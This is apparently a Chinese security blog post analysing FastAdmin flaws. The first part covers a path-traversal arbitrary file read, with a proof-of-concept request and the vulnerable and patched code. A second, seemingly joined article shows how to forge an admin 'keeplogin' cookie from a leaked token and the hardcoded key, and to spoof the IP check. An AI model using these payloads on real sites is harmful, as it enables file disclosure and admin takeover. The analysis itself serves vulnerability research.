---
title: '对 Fastadmin lang任意文件读取漏洞的代码分析'
description: 'FastAdmin是一款基于ThinkPHP+Bootstrap的极速后台开发框架。结合最近的漏洞对这个漏洞的成因进行分析。'
publishDate: '2025-04-30'
heroImage: {
    src: './1p7YKWgMzqxfpWYxhYLKELFTwLUYhX9P.webp'
}
---

FastAdmin是一款基于ThinkPHP+Bootstrap的极速后台开发框架。 
# POC

```php
GET /index/ajax/lang?lang=../../application/database HTTP/1.1

Host: xxx.xxx.xxx.xxx

```

# 代码分析 ## 1.2.0.20210125_beta版本分析

定位到相关文件`application\\index\\controller\\Ajax.php`：

```php
<?php

namespace app\\index\\controller;
use app\\common\\controller\\Frontend;
use think\\Lang;
/**

* Ajax异步请求接口

* @internal

*/

class Ajax extends Frontend

{

  

protected $noNeedLogin = [\'lang\', \'upload\'];

protected $noNeedRight = [\'*\'];

protected $layout = \'\';

  

/**

* 加载语言包

*/

public function lang()

{

header(\'Content-Type: application/javascript\');

header(\"Cache-Control: public\");

header(\"Pragma: cache\");

  

$offset = 30 * 60 * 60 * 24; // 缓存一个月

header(\"Expires: \" . gmdate(\"D, d M Y H:i:s\", time() + $offset) . \" GMT\");

  

$controllername = input(\"controllername\");

$this->loadlang($controllername);

//强制输出JSON Object

$result = jsonp(Lang::get(), 200, [], [\'json_encode_param\' => JSON_FORCE_OBJECT | JSON_UNESCAPED_UNICODE]);

return $result;

}

  

/**

* 上传文件

*/

public function upload()

{

return action(\'api/common/upload\');
}
}
```

跟进`application\\common\\controller\\Frontend.php`文件中的`loadlang`方法：

```php
protected function loadlang($name)

{
	$name = Loader::parseName($name);
	Lang::load(APP_PATH . $this->request->module() . \'/lang/\' . $this->request->langset() . \'/\' . str_replace(\'.\', \'/\', $name) . \'.php\');
}
```

可以看到对`$name`没有任何过滤的处理，可构造类似`../../application/database`Payload读取任意PHP文件。

## 已修复最新版本分析

直接定位文件``application\\common\\controller\\Frontend.php``：

```php
protected function loadlang($name){
	$name = Loader::parseName($name);
	$lang = $this->request->langset();
	$lang = preg_match(\"/^([a-zA-Z\\-_]{2,10})\\$/i\", $lang) ? $lang : \'zh-cn\';
	Lang::load(APP_PATH . $this->request->module() . \'/lang/\' . $lang . \'/\' . str_replace(\'.\', \'/\', $name) . \'.php\');
}
```

通过`/^([a-zA-Z\\-_]{2,10})\\$/i`对路径语言进行过滤，防止通过`../`跨目录读取。

## 彩蛋

在查看`application/common/controller/Api.php`历史文件中，发现`loadlang`方法的历史提交记录如下。

```php
//V1版本
protected function loadlang($name){
	$name = Loader::parseName($name);
	Lang::load(APP_PATH . $this->request->module() . \'/lang/\' . $this->request->langset() . \'/\' . str_replace(\'.\', \'/\', $name) . \'.php\');
}

```


```php
//V2版本
protected function loadlang($name){
	$name = Loader::parseName($name);
	$lang = $this->request->langset();
	$lang = preg_match(\"/^([a-zA-Z\\-_]{2,10})\\$/i\", $lang) ? $lang : \'zh-cn\';
	Lan::load(APP_PATH . $this->request->module() . \'/lang/\' . $lang . \'/\' . str_replace(\'.\', \'/\', $name) . \'.php\');
}
```


```php
//V3版本
protected function loadlang($name)
{
	$name = Loader::parseName($name);
	$name = preg_match(\"/^([a-zA-Z0-9_\\.\\/]+)\\$/i\", $name) ? $name : \'index\';
	$lang = $this->request->langset();
	$lang = preg_match(\"/^([a-zA-Z\\-_]{2,10})\\$/i\", $lang) ? $lang : \'zh-cn\';
	Lang::load(APP_PATH . $this->request->module() . \'/lang/\' . $lang . \'/\' . str_replace(\'.\', \'/\', $name) . \'.php\');
}

```

  
  


  

FastAdmin是一款基于ThinkPHP+Bootstrap的极速后台开发框架。 # 利用条件

在有数据库读权限的情况下（例如SQL注入），无法通过新增用户登录后台可利用逻辑伪造登录。

# 代码分析

在`application/admin/controller/Index.php`中查看`login`方法,其中有一段代码如下，

```php title="application/admin/controller/Index.php"

if ($this->auth->autologin()) {

Session::delete(\"referer\");

$this->redirect($url);

}

```

跟进`autologin()`，在`application/admin/library/Auth.php`中找到`autologin()`方法

```php title="application/admin/library/Auth.php"

public function autologin()

{

$keeplogin = Cookie::get(\'keeplogin\');

if (!$keeplogin) {

return false;

}

list($id, $keeptime, $expiretime, $key) = explode(\'|\', $keeplogin);

if ($id && $keeptime && $expiretime && $key && $expiretime > time()) {

$admin = Admin::get($id);

if (!$admin || !$admin->token) {

return false;

}

//token有变更

if ($key != $this->getKeeploginKey($admin, $keeptime, $expiretime)) {

return false;

}

$ip = request()->ip();

//IP有变动

if ($admin->loginip != $ip) {

return false;

}

Session::set(\"admin\", $admin->toArray());

Session::set(\"admin.safecode\", $this->getEncryptSafecode($admin));

//刷新自动登录的时效

$this->keeplogin($admin, $keeptime);

return true;

} else {

return false;

}

}

```

整个变量`$keeplogin`处于可控状态，只需要满足函数`getKeeploginKey`的返回值为真且IP与数据库中的IP一致即可。

跟进函数`getKeeploginKey`

```php

public function getEncryptKeeplogin($params, $keeptime)

{

$expiretime = time() + $keeptime;

$key = md5(md5($params[\'id\']) . md5($keeptime) . md5($expiretime) . $params[\'token\'] . config(\'token.key\'));

return implode(\'|\', [$this->id, $keeptime, $expiretime, $key]);

}

```

这里两个值不可控，其中`$params[\'token\']`及`config(\'token.key\')`分别在数据库及配置文件中。 # 利用分析

我们仅需有数据库的读数据权限（往往是SQL注入漏洞获得）可尝试利用。

其余`config(\'token.key\')`在配置文件中为硬编码，在不修改的情况下可利用该逻辑伪造登录后台。

分析代码，确定利用方式如下

```

id-->11-->6512bd43d9caa6e02c990b0a82652dca

  

keeptime-->86400-->641bed6f12f5f0033edd3827deec6759

  

expiretime-->1728386749-->94ce8cac9f4abe2fc673bc9a48c8e3aa

  

token-->84430494-801e-4302-a032-c302ca0b3dfe

  

key-->6512bd43d9caa6e02c990b0a82652dca641bed6f12f5f0033edd3827deec675994ce8cac9f4abe2fc673bc9a48c8e3aa84430494-801e-4302-a032-c302ca0b3dfei0TzJlGnaCqvgWASw3ZN1kREY5DbO42I-->54cada4a0d23bf68e7b8dcc2e9eb6e6c

  

token.key-->i0TzJlGnaCqvgWASw3ZN1kREY5DbO42I

  

keeplogin-->11|86400|1728386749|54cada4a0d23bf68e7b8dcc2e9eb6e6c

```

得出keeplogin后添加到cookie,IP利用X-foward伪造即可。

